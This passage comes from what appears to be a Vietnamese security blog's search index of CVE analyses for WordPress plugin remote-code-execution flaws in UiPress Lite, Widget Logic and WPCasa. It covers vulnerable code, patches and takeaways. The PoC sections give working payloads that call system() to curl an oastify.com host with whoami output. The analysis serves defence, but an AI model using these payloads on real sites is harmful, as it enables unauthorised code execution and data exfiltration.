ng·ªØ c·∫£nh DOING_AJAX. C∆° ch·∫ø n√†y kh√¥ng ki·ªÉm tra quy·ªÅn (capability) c·ªßa ng∆∞·ªùi d√πng nh∆∞ current_user_can(), m√† ch·ªâ x√°c minh t√≠nh h·ª£p l·ªá c·ªßa y√™u c·∫ßu. V√¨ v·∫≠y, ng∆∞·ªùi d√πng ƒë√£ x√°c th·ª±c (Subscriber tr·ªü l√™n) c√≥ th·ªÉ ch·ªâ ƒë·ªãnh b·∫•t k·ª≥ h√†m PHP h·ª£p l·ªá n√†o ‚Üí d·∫´n ƒë·∫øn Remote Code Execution (RCE). public static function check_referer() { $doingAjax = defined(\"DOING_AJAX\") \u0026\u0026 DOING_AJAX ? true : false; $referer = check_ajax_referer(\"uip-security-nonce\", \"security\") \u003e 0 ? true : false; $result = $doingAjax \u0026\u0026 $referer ? true : false; // Abort if not doing ajax or bad referer if (!$result) { $message = __(\"Unable to perform action\", \"uipress-lite\"); self::error($message); } } D·ªØ li·ªáu t·ª´ $_POST[\"formData\"] ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng stripslashes() r·ªìi ƒë∆∞a v√†o json_decode(), v√¨ v·∫≠y $data th∆∞·ªùng l√† m·ªôt stdClass (ho·∫∑c ki·ªÉu d·ªØ li·ªáu t∆∞∆°ng ·ª©ng v·ªõi n·ªôi dung JSON). Sau ƒë√≥ gi√° tr·ªã n√†y ƒë∆∞·ª£c truy·ªÅn th√™m qua Sanitize::clean_input_with_code(), tuy c√≥ t√°c d·ª•ng l·ªçc d·ªØ li·ªáu, nh∆∞ng kh√¥ng ki·ªÉm so√°t vi·ªác th·ª±c thi h√†m. M·∫πo N·∫øu truy·ªÅn $_POST[\"formData\"] ·ªü d·∫°ng chu·ªói m√† kh√¥ng ph·∫£i d·∫°ng JSON ‚Äú{}‚Äù th√¨ json_decode() s·∫Ω tr·∫£ v·ªÅ chu·ªói m√† kh√¥ng ph·∫£i stdClass. Ta c√≥ th·ªÉ control $data m·ªôt c√°ch tr·ªçn v·∫πn nh·∫•t Ti·∫øp theo, t√™n h√†m ƒë∆∞·ª£c l·∫•y t·ª´ $_POST[\"userFunction\"] v√† ch·ªâ ƒë∆∞·ª£c ki·ªÉm tra b·∫±ng function_exists(). ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† b·∫•t k·ª≥ h√†m PHP h·ª£p l·ªá n√†o ƒëang t·ªìn t·∫°i trong m√¥i tr∆∞·ªùng WordPress/PHP ƒë·ªÅu c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi, mi·ªÖn l√† attacker bi·∫øt ho·∫∑c ƒëo√°n ƒë∆∞·ª£c t√™n h√†m ƒë√≥. Cu·ªëi c√πng, d√≤ng $userFunction($data); th·ª±c hi·ªán dynamic function call v·ªõi tham s·ªë l√† d·ªØ li·ªáu do ng∆∞·ªùi d√πng g·ª≠i l√™n. Vi·ªác cho ph√©p ng∆∞·ªùi d√πng ki·ªÉm so√°t tr·ª±c ti·∫øp t√™n h√†m ƒë∆∞·ª£c g·ªçi, m√† kh√¥ng d√πng whitelist v√† kh√¥ng ki·ªÉm tra quy·ªÅn, t·∫°o ra l·ªó h·ªïng Remote Code Execution (RCE) ho·∫∑c √≠t nh·∫•t l√† Arbitrary Function Call, cho ph√©p attacker ƒë√£ x√°c th·ª±c (v√≠ d·ª•: Subscriber tr·ªü l√™n) g·ªçi c√°c h√†m nguy hi·ªÉm nh∆∞ system(), exec(), shell_exec(), eval()‚Ä¶ t·ª´ ƒë√≥ c√≥ th·ªÉ th·ª±c thi l·ªánh tr√™n m√°y ch·ªß ho·∫∑c thao t√∫ng h·ªá th·ªëng. B·∫£n v√° (v3.5.08): public function uip_process_form_input() { // Check security nonce and 'DOING_AJAX' global Ajax::check_referer(); Ajax::error(__(\"Passing form data to user specified functions has been disabled to prevent potential security issues.\", \"uipress-lite\")); } B·∫£n v√° ƒë√£ v√° l·∫°i b·∫±ng c√°ch lo·∫°i b·ªè logic c·ªßa h√†m n√†y :)). S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\r","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rpublic function load_ajax() { $function_names = [ \"uip_get_users_and_roles\", \"uip_get_post_types\", \"uip_get_recent_posts\", \"uip_get_posts_for_table\", \"uip_get_post_table_columns\", \"uip_delete_post\", \"uip_save_user_preference\", \"uip_get_user_preference\", \"uip_search_content\", \"uip_process_form_input\", \"uip_send_form_email\", \"uip_save_form_as_option\", \"uip_save_form_as_user_option\", \"uip_pre_populate_form_data\", \"uip_create_frame_switch\", \"uip_get_sync_options\", \"uip_refresh_sync_key\", \"uip_save_sync_options\", \"uip_start_site_sync\", \"uip_check_for_template_updates\", \"uip_process_block_query\", \"uip_save_site_option\", \"uip_send_message_to_gpt\", \"uip_global_export\", \"uip_global_import\", \"uip_push_new_custom_menu_items\", \"uip_remove_custom_menu_items\", ]; // Push ajax actions foreach ($function_names as $name) { add_action(\"wp_ajax_{$name}\", [$this, $name]); } } Plugin ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c AJAX action th√¥ng qua h√†m load_ajax(), m·ªói t√™n trong m·∫£ng $function_names ƒë∆∞·ª£c g·∫Øn v·ªõi add_action(\"wp_ajax_{$name}\", [$this, $name]). ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† khi g·ª≠i y√™u c·∫ßu ƒë·∫øn /wp-admin/admin-ajax.php k√®m tham s·ªë action = $name, WordPress s·∫Ω g·ªçi tr·ª±c ti·∫øp ph∆∞∆°ng th·ª©c c√≥ c√πng t√™n trong class c·ªßa plugin. Trong danh s√°ch n√†y c√≥ uip_process_form_input, v√¨ v·∫≠y m·ªôt request nh∆∞: POST /wp-admin/admin-ajax.php action=uip_process_form_input\u0026security=...\u0026formData=...\u0026userFunction=... s·∫Ω k√≠ch ho·∫°t h√†m uip_process_form_input(). ","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress g·ªçi uip_process_form_input()\"]\rB --\u003e C[\"Ajax::check_referer()\"]\rC --\u003e D[\"$data = json_decode(formData)\"]\rD --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"]\rE --\u003e F{\"function_exists($userFunction)?\"}\rF --\u003e|Yes| G[\"$userFunction($data)\"]\rF --\u003e|No| H[\"Ajax::error()\"]\rG --\u003e I[\"wp_send_json(success)\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress g·ªçi uip_process_form_input()\"]\rB --\u003e C[\"Ajax::check_referer()\"]\rC --\u003e D[\"$data = json_decode(formData)\"]\rD --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"]\rE --\u003e F{\"function_exists($userFunction)?\"}\rF --\u003e|Yes| G[\"$userFunction($data)\"]\rF --\u003e|No| H[\"Ajax::error()\"]\rG --\u003e I[\"wp_send_json(success)\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress g·ªçi uip_process_form_input()\"]\rB --\u003e C[\"Ajax::check_referer()\"]\rC --\u003e D[\"$data = json_decode(formData)\"]\rD --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"]\rE --\u003e F{\"function_exists($userFunction)?\"}\rF --\u003e|Yes| G[\"$userFunction($data)\"]\rF --\u003e|No| H[\"Ajax::error()\"]\rG --\u003e I[\"wp_send_json(success)\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress g·ªçi uip_process_form_input()\"]\rB --\u003e C[\"Ajax::check_referer()\"]\rC --\u003e D[\"$data = json_decode(formData)\"]\rD --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"]\rE --\u003e F{\"function_exists($userFunction)?\"}\rF --\u003e|Yes| G[\"$userFunction($data)\"]\rF --\u003e|No| H[\"Ajax::error()\"]\rG --\u003e I[\"wp_send_json(success)\"]\r","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rƒêƒÉng nh·∫≠p v·ªõi user Subcriber L·∫•y security t·ª´ response Gi√° tr·ªã security\rG·ª≠i request ch·ª©a payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=uip_process_form_input\u0026security=65c1a4e801\u0026formData=\"curl+http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)\"\u0026userFunction=system K·∫øt qu·∫£\r","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-3053 xu·∫•t ph√°t t·ª´ vi·ªác uip_process_form_input() cho ph√©p ng∆∞·ªùi d√πng ki·ªÉm so√°t tr·ª±c ti·∫øp t√™n h√†m ƒë∆∞·ª£c th·ª±c thi th√¥ng qua userFunction, ch·ªâ ki·ªÉm tra b·∫±ng function_exists() v√† kh√¥ng c√≥ capability check hay whitelist. ƒêi·ªÅu n√†y khi·∫øn ng∆∞·ªùi d√πng ƒë√£ x√°c th·ª±c ·ªü m·ª©c th·∫•p (Subscriber) c√≥ th·ªÉ th·ª±c hi·ªán Arbitrary Function Call, d·∫´n t·ªõi Remote Code Execution (RCE). Phi√™n b·∫£n 3.5.08 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch v√¥ hi·ªáu h√≥a ho√†n to√†n c∆° ch·∫ø n√†y. ","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rKh√¥ng cho ph√©p user ki·ªÉm so√°t dynamic function call n·∫øu kh√¥ng c√≥ whitelist. nonce / check_ajax_referer() kh√¥ng thay th·∫ø cho current_user_can(). function_exists() kh√¥ng ph·∫£i c∆° ch·∫ø b·∫£o m·∫≠t. L·ªói logic nguy hi·ªÉm h∆°n sanitize sai d·ªØ li·ªáu. Lu√¥n √°p d·ª•ng nguy√™n t·∫Øc least privilege cho c√°c AJAX endpoint. ","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress UiPress lite Plugin \u003c= 3.5.07 is vulnerable to PHP Object Injection ","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Widget Logic Plugin.","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Improper Control of Generation of Code (‚ÄòCode Injection‚Äô) trong Widgetlogic.org Widget Logic (widget-logic) cho ph√©p Code Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng t·ªõi Widget Logic t·ª´ phi√™n b·∫£n n/a ƒë·∫øn \u003c= 6.0.5. CVE ID: CVE-2025-32222 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 6.0.5 Patched Versions: 6.0.6 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Widget Logic Plugin ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Widget Logic: 6.0.5 ‚Äì vulnerable 6.0.6 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v6.0.5): function widget_logic_check_logic($logic) { $logic = @trim((string) $logic); $logic = apply_filters(\"widget_logic_eval_override\", $logic); if (is_bool($logic)) { return $logic; } if ($logic === '') { return true; } if (stristr($logic, 'return') === false) { $logic = 'return (' . html_entity_decode($logic, ENT_COMPAT | ENT_HTML401 | ENT_QUOTES) . ');'; } set_error_handler('widget_logic_error_handler'); // phpcs:ignore -- we have mode for debugging for admins try { $show_widget = eval ($logic); // @codingStandardsIgnoreLine - widget can't work without eval } catch (Error $e) { trigger_error($e-\u003egetMessage(), E_USER_WARNING); // @codingStandardsIgnoreLine - message is not dependent on user input $show_widget = false; } restore_error_handler(); return $show_widget; } H√†m widget_logic_check_logic() s·ª≠ d·ª•ng eval() ƒë·ªÉ th·ª±c thi tr·ª±c ti·∫øp chu·ªói logic do ng∆∞·ªùi d√πng cung c·∫•p, kh√¥ng gi·ªõi h·∫°n h√†m n√†o ƒë∆∞·ª£c g·ªçi. N·∫øu chu·ªói logic kh√¥ng ch·ª©a t·ª´ kh√≥a return, h√†m s·∫Ω t·ª± ƒë·ªông b·ªçc n√≥ th√†nh m·ªôt c√¢u l·ªánh return(...) ƒë·ªÉ ƒë·∫£m b·∫£o bi·ªÉu th·ª©c lu√¥n h·ª£p l·ªá khi eval() th·ª±c thi. C∆° ch·∫ø n√†y gi√∫p ng∆∞·ªùi d√πng ch·ªâ c·∫ßn nh·∫≠p bi·ªÉu th·ª©c ƒëi·ªÅu ki·ªán ƒë∆°n gi·∫£n, nh∆∞ng ƒë·ªìng th·ªùi c≈©ng bi·∫øn m·ªçi input c·ªßa ng∆∞·ªùi d√πng th√†nh m√£ PHP ho√†n ch·ªânh, l√†m tƒÉng nguy c∆° th·ª±c thi m√£ t√πy √Ω (RCE). B·∫£n v√° (v6.0.6): function widget_logic_check_logic($logic) { $allowed_functions = array( 'is_home', 'is_front_page', 'is_single', 'is_page', 'is_category', 'is_tag', 'is_archive', 'is_search', 'is_404', 'is_user_logged_in', 'current_user_can', 'is_active_sidebar', 'is_admin', ); $allowed_functions = apply_filters('widget_logic_allowed_functions', $allowed_functions); $logic = trim((string) $logic); if ('' === $logic) { return true; } // Set up error handling set_error_handler('widget_logic_error_handler', E_WARNING | E_USER_WARNING); // @codingStandardsIgnoreLine - we need this for error handling try { // Tokenize the logic string $tokens = widget_logic_tokenize($logic); // Parse and evaluate the expression $pos = 0; $result = widget_logic_parse_expression($tokens, $pos, $allowed_functions); // Check if there are any unexpected tokens after the expression if ($pos \u003c count($tokens)) { throw new Exception(esc_html__('Widget Logic: Unexpected tokens after expression.', 'widget-logic')); } return (bool)$result; } catch (Exception $e) { widget_logic_error_handler(E_USER_WARNING, $e-\u003egetMessage()); return false; } finally { restore_error_handler(); } } S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rB·∫£n v√° ƒë√£ lo·∫°i b·ªè eval(), thay b·∫±ng tokenizer v√† parser ƒë·ªÉ ƒë√°nh gi√° logic, ch·ªâ cho ph√©p c√°c h√†m trong danh s√°ch whitelist. N√≥ ki·ªÉm tra c√∫ ph√°p, ph√°t hi·ªán token d∆∞, x·ª≠ l√Ω l·ªói b·∫±ng try/catch/finally, t·ª´ ƒë√≥ tƒÉng c∆∞·ªùng b·∫£o m·∫≠t v√† ƒë·∫£m b·∫£o logic widget v·∫´n ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng. ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt filter hook: add_filter('render_block', 'widget_logic_block_render', 10, 2); render_block: hook filter c·ªßa WordPress, ƒë∆∞·ª£c g·ªçi m·ªói khi m·ªôt block (Gutenberg block) ƒë∆∞·ª£c render. T·ª©c khi post/page ƒë∆∞·ª£c t·∫°o, plugin s·∫Ω can thi·ªáp v√†o qu√° tr√¨nh render block v·ªõi callback widget_logic_block_render function widget_logic_block_render($block_content, $block) { if (!isset($block['attrs']['widgetLogic'])) { return $block_content; } return widget_logic_check_logic($block['attrs']['widgetLogic']) ? $block_content : ''; } H√†m widget_logic_block_render s·∫Ω ki·ªÉm tra n·∫øu block kh√¥ng c√≥ attribute widgetLogic, n√≥ s·∫Ω hi·ªÉn th·ªã b√¨nh th∆∞·ªùng. Attribute n√†y ƒë∆∞·ª£c th√™m v√†o th√¥ng qua Advanced Option khi th√™m block. Widget Logic trong Advanced Option\rwidget_logic_check_logic ƒë∆∞·ª£c g·ªçi N·∫øu block c√≥ attribute n√†y. L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Contributor v√¨ ƒë√¢y l√† ƒë·∫∑c quy·ªÅn c√≥ th·ªÉ t·∫°o post v√† s·ª≠ d·ª•ng Widget Logic trong Advanced Option. ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rƒêƒÉng nh·∫≠p v·ªõi user Contributor T·∫°o post, th√™m m·ªôt block b·∫•t k√¨ v√† th√™m payload v√†o Widget Logic: system('curl http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)') K·∫øt qu·∫£\r","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE‚Äë2025‚Äë32222 b·∫Øt ngu·ªìn t·ª´ vi·ªác s·ª≠ d·ª•ng eval() tr√™n d·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t trong widget_logic_check_logic(). Ch·ªâ v·ªõi quy·ªÅn Contributor, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n logic ƒë·ªôc h·∫°i v√†o thu·ªôc t√≠nh widgetLogic c·ªßa block, khi·∫øn m√£ PHP t√πy √Ω ƒë∆∞·ª£c th·ª±c thi trong qu√° tr√¨nh render_block. C∆° ch·∫ø t·ª± ƒë·ªông b·ªçc return(...) c√†ng l√†m vi·ªác khai th√°c d·ªÖ d√†ng h∆°n v√¨ m·ªçi chu·ªói nh·∫≠p v√†o cu·ªëi c√πng ƒë·ªÅu tr·ªü th√†nh m√£ PHP h·ª£p l·ªá. B·∫£n v√° 6.0.6 ƒë√£ x·ª≠ l√Ω tri·ªát ƒë·ªÉ b·∫±ng c√°ch lo·∫°i b·ªè eval(), d√πng c∆° ch·∫ø tokenize + parse + allowlist, t·ª´ ƒë√≥ ch·∫∑n ho√†n to√†n kh·∫£ nƒÉng th·ª±c thi m√£ t√πy √Ω. ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rKh√¥ng bao gi·ªù s·ª≠ d·ª•ng eval() v·ªõi d·ªØ li·ªáu ƒë·∫øn t·ª´ ng∆∞·ªùi d√πng, k·ªÉ c·∫£ ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn th·∫•p h∆°n admin. C√°c bi·ªÉu th·ª©c logic n√™n ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng parser ri√™ng + whitelist h√†m h·ª£p l·ªá, kh√¥ng ph·∫£i th·ª±c thi tr·ª±c ti·∫øp. D·ªØ li·ªáu g·∫Øn v√†o block (block attributes) v·∫´n l√† user input v√† ph·∫£i ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t ch·∫Ω. Ch·ªâ c·∫ßn quy·ªÅn Contributor c≈©ng c√≥ th·ªÉ g√¢y ra RCE nghi√™m tr·ªçng n·∫øu c∆° ch·∫ø ki·ªÉm so√°t ƒë·∫ßu v√†o sai. Vi·ªác thay th·∫ø eval() b·∫±ng c√°ch ti·∫øp c·∫≠n ph√¢n t√≠ch c√∫ ph√°p an to√†n l√† h∆∞·ªõng ƒëi ƒë√∫ng cho c√°c plugin x·ª≠ l√Ω ‚Äúlogic ng∆∞·ªùi d√πng‚Äù. ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress Widget Logic Plugin \u003c= 6.0.5 is vulnerable to PHP Object Injection ","date":"2025-11-30","objectID":"/vi/posts/2025-11-30-cve-2025-32222/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/vi/posts/2025-11-30-cve-2025-32222/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WPCasa Plugin.","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin WPCasa cho WordPress d·ªÖ b·ªã t·∫•n c√¥ng Code Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm 1.4.1. Nguy√™n nh√¢n l√† do vi·ªác x√°c th·ª±c v√† gi·ªõi h·∫°n ƒë·∫ßu v√†o kh√¥ng ƒë·∫ßy ƒë·ªß trong h√†m 'api_requests'. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ g·ªçi c√°c h√†m t√πy √Ω v√† th·ª±c thi m√£. CVE ID: CVE-2025-9321 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.4.1 Patched Versions: 1.4.2 CVSS severity: High (10) Required Privilege: Contributor Product: WordPress WPCasa Plugin ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WPCasa: 1.4.1 ‚Äì vulnerable 1.4.2 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v1.4.1): public function api_requests() { global $wp; if ( ! empty( $_GET['wpsight-api'] ) ) $wp-\u003equery_vars['wc-api'] = sanitize_text_field( $_GET['wpsight-api'] ); if ( ! empty( $wp-\u003equery_vars['wc-api'] ) ) { // Buffer, we won't want any output here ob_start(); // Get API trigger $api = strtolower( esc_attr( $wp-\u003equery_vars['wpsight-api'] ) ); // Load class if exists if ( class_exists( $api ) ) $api_class = new $api(); // Trigger actions do_action( 'wpsight_api_' . $api ); // Done, clear buffer and exit ob_end_clean(); die('1'); } } H√†m n√†y l·∫•y tham s·ªë wpsight-api t·ª´ URL, d√πng n√≥ ƒë·ªÉ t·∫°o class n·∫øu t·ªìn t·∫°i v√† g·ªçi hook do_action t∆∞∆°ng ·ª©ng, sau 